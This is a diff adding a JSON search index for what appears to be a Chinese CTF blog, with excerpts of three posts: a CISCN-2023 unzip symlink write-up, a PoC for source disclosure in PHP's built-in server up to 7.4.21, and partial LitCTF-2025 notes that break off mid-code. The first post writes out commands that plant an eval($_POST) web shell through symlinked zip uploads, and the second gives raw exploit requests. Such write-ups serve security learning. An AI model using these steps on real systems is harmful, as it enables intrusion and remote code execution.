@@ -1,0 +1,19 @@
+[
+  {
+    "objectID": "1750219200",
+    "permalink": "/post/ciscn_unzip/",
+    "title": "CISCN-2023 Unzip","content": "\runzip\r题目源码\n\u0026lt;?php error_reporting(0); highlight_file(__FILE__); $finfo = finfo_open(FILEINFO_MIME_TYPE); if (finfo_file($finfo, $_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;]) === \u0026#39;application/zip\u0026#39;){ exec(\u0026#39;cd /tmp \u0026amp;\u0026amp; unzip -o \u0026#39; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;]); }; //only this! 分析\r关键代码\nexec(\u0026#39;cd /tmp \u0026amp;\u0026amp; unzip -o \u0026#39; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;]); // -o参数：如有同名的文件直接覆盖 上传.zip文件后 1、验证MIME值、是否为.zip文件 2、先cd /tmp目录，之后解压文件\n解题的关键在于上传的文件在/tmp目录下，上传的马无法访问 tips： 软连接：可以将某个目录连接到另一个目录或者文件下，那么我们以后对这个目录的任何操作，都会作用到另一个目录或者文件下。\n查询unzip相关的资料，发现了这个命令可以与软连接挂钩\n思路\r先上传一个软连接的压缩包，解压后指向-\u0026gt;/var/www/html/ 后上传一个有软连接和马的压缩包，解压后可在线访问 1、创建软连接并压缩\nmkdir hh cd hh ln -s /var/www/html link zip --symlinks link.zip link 2、删除原有的link软连接，创建与软连接同名的link文件夹，在link文件夹内写马,最后压缩\nrm link mkdir link cd link echo \u0026#34;\u0026lt;?php echo 123;eval($_POST[0]);?\u0026gt;\u0026#34; \u0026gt; shell.php cd .. zip -r link1.zip ./link ls 3、依次上传link.zip和link1.zip,访问url/shell.php\n","date": "2025-06-18 12:00:00",
+    "updated": "2025-06-18 12:00:00"
+  }, 
+  {
+    "objectID": "1750219200",
+    "permalink": "/post/php_server/",
+    "title": "PHP server源码泄露漏洞复现","content": "\rPHP server源码泄露漏洞复现\rphp＜= 7 . 4 . 21 development server源码泄露漏洞复现 - 凪白Kw - 博客园\nphp＜= 7 . 4 . 21 通过php -S开起的内置WEB服务器存在源码泄露漏洞 poc\nGET /phpinfo.php HTTP/1.1 Host: pd.research \\r\\n \\r\\n GET / HTTP/1.1 \\r\\n ps：这里一定要换行 一定能要关闭自动更新Content-Length\n这里我们稍微解释一下第一个GET和第二个GET的作用分别是什么 第一个GET后的/phpinfo.php是直接访问已存在的phpinfo.php文件(一般可以是访问index.php) PHP源码中的php_cli_server_request_translate_vpath函数将请求的PHP文件的路径转换为文件系统上的完整路径。如果请求的文件是一个目录，它会检查是否存在索引文件，如index.php或 index.html，并使用其中一个文件的路径(如果找到的话)。这允许服务器响应请求提供正确的文件 而第二个GET后的/请求的是目录而不是文件。此PHP版本提供的代码包括一个检查，以确定请求的文件是应被视为静态文件还是作为PHP文件执行。这是通过检查文件的扩展名来完成的。如果扩展不是.php或.PHP，或者如果扩展名的长度不等于3,则该文件被视为静态文件，因此如果我们把第二个GET请求的内容改为类似1.txt的文件时，php源码将会被以静态文件的方式泄露(即直接访问获取)\n","date": "2025-06-18 12:00:00",
+    "updated": "2025-06-18 12:00:00"
+  }, 
+  {
+    "objectID": "1748102400",
+    "permalink": "/post/litctf/",
+    "title": "LitCTF-2025","content": "\rLitCTF\r队伍信息\nweb\rnest_js\r爆破账号密码，admin:password\n登入就有flag\n星愿信箱\r过滤了{{的ssti\n多重宇宙日记\r注册账号a,a,登入在个人资料处看源代码\n// 更新表单的JS提交 document.getElementById(\u0026amp;#39;profileUpdateForm\u0026amp;#39;).addEventListener(\u0026amp;#39;submit\u0026amp;#39;, async function(event) { event.preventDefault(); const statusEl = document.getElementById(\u0026amp;#39;updateStatus\u0026amp;#39;); const currentSettingsEl = document.getElementById(\u0026amp;#39;currentSettings\u0026amp;#39;); statusEl.textContent = \u0026amp;#39;正在更新...\u0026amp;#39;; const formData = new FormData(event.target); const settingsPayload = {}; // 构建 settings 对象，只包含有值的字段 if (formData.get(\u0026amp;#39;theme\u0026amp;#39;)) settingsPayload.theme = formData.get(\u0026amp;#39;theme\u0026amp;#39;); if (formData.get(\u0026amp;#39;language\u0026amp;#39;)) settingsPayload.language = formData.get(\u0026amp;#39;language\u0026amp;#39;); // ...可以添加其他字段 try { const response = await fetch(\u0026amp;#39;/api/profile/update\u0026amp;#39;, { method: \u0026amp;#39;POST\u0026amp;#39;, headers: { \u0026amp;#39;Content-Type\u0026amp;#39;: \u0026amp;#39;application/json\u0026amp;#39;, }, body: JSON.stringify({ settings: settingsPayload }) // 包装在 \u0026amp;#34;settings\u0026amp;#34;键下 }); const result = …","date": "2025-05-25 00:00:00",
+    "updated": "2025-05-25 00:00:00"
+  }]
